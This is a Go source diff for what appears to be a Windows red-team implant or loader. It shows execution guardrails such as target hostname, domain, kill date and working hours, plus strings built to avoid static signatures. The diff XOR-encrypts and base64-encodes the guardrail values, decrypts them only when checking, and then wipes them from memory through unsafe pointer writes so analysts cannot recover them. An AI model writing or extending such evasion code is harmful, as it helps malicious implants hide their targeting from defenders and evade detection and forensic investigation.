@@ -5,6 +5,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -17,9 +18,9 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// Build-time variables that will be set via ldflags
+// Build-time variables that will be set via ldflags (XOR encrypted)
 var (
-	// Safety check variables - set at build time
+	// Safety check variables - set at build time (XOR encrypted with xorKey)
 	safetyHostname       string = ""
 	safetyUsername       string = ""
 	safetyDomain         string = ""
@@ -30,6 +31,40 @@ var (
 	safetyWorkHoursStart string = ""
 	safetyWorkHoursEnd   string = ""
 )
+
+// decryptSafetyValue decrypts a XOR-encrypted safety value
+func decryptSafetyValue(encrypted string) string {
+	if encrypted == "" {
+		return ""
+	}
+	decoded, err := base64.StdEncoding.DecodeString(encrypted)
+	if err != nil {
+		return ""
+	}
+	result := make([]byte, len(decoded))
+	for i := 0; i < len(decoded); i++ {
+		result[i] = decoded[i] ^ xorKey[i%len(xorKey)]
+	}
+	return string(result)
+}
+
+// clearString overwrites string memory to prevent recovery
+func clearString(s *string) {
+	if s == nil || *s == "" {
+		return
+	}
+	hdr := (*struct {
+		Data uintptr
+		Len  int
+	})(unsafe.Pointer(s))
+	if hdr.Data == 0 || hdr.Len == 0 {
+		return
+	}
+	for i := 0; i < hdr.Len; i++ {
+		*(*byte)(unsafe.Pointer(hdr.Data + uintptr(i))) = 0
+	}
+	*s = ""
+}
 
 // Exec requirements strings (constructed to avoid static signatures)
 var (
@@ -92,59 +127,76 @@ const (
 )
 
 // PerformSafetyChecks runs all configured safety checks
-// Returns true if all checks pass, false otherwise
+// Safety values are XOR encrypted - decrypt, compare, then clear from memory
 func PerformSafetyChecks() bool {
-	// If no safety checks are configured, allow execution
 	if !hasSafetyChecks() {
 		return true
 	}
 
-	// Check hostname
 	if safetyHostname != "" {
-		if !checkHostname(safetyHostname) {
+		expected := decryptSafetyValue(safetyHostname)
+		result := checkHostname(expected)
+		clearString(&expected)
+		if !result {
 			return false
 		}
 	}
 
-	// Check username
 	if safetyUsername != "" {
-		if !checkUsername(safetyUsername) {
+		expected := decryptSafetyValue(safetyUsername)
+		result := checkUsername(expected)
+		clearString(&expected)
+		if !result {
 			return false
 		}
 	}
 
-	// Check domain
 	if safetyDomain != "" {
-		if !checkDomain(safetyDomain) {
+		expected := decryptSafetyValue(safetyDomain)
+		result := checkDomain(expected)
+		clearString(&expected)
+		if !result {
 			return false
 		}
 	}
 
-	// Check file existence
 	if safetyFilePath != "" {
-		mustExist := safetyFileMustExist == erWordTrue
-		if !checkFile(safetyFilePath, mustExist) {
+		path := decryptSafetyValue(safetyFilePath)
+		mustExistVal := decryptSafetyValue(safetyFileMustExist)
+		mustExist := mustExistVal == erWordTrue
+		result := checkFile(path, mustExist)
+		clearString(&path)
+		clearString(&mustExistVal)
+		if !result {
 			return false
 		}
 	}
 
-	// Check process
 	if safetyProcess != "" {
-		if !checkProcess(safetyProcess) {
+		expected := decryptSafetyValue(safetyProcess)
+		result := checkProcess(expected)
+		clearString(&expected)
+		if !result {
 			return false
 		}
 	}
 
-	// Check kill date
 	if safetyKillDate != "" {
-		if !checkKillDate(safetyKillDate) {
+		expected := decryptSafetyValue(safetyKillDate)
+		result := checkKillDate(expected)
+		clearString(&expected)
+		if !result {
 			return false
 		}
 	}
 
-	// Check working hours
 	if safetyWorkHoursStart != "" && safetyWorkHoursEnd != "" {
-		if !checkWorkingHours(safetyWorkHoursStart, safetyWorkHoursEnd) {
+		start := decryptSafetyValue(safetyWorkHoursStart)
+		end := decryptSafetyValue(safetyWorkHoursEnd)
+		result := checkWorkingHours(start, end)
+		clearString(&start)
+		clearString(&end)
+		if !result {
 			return false
 		}
 	}
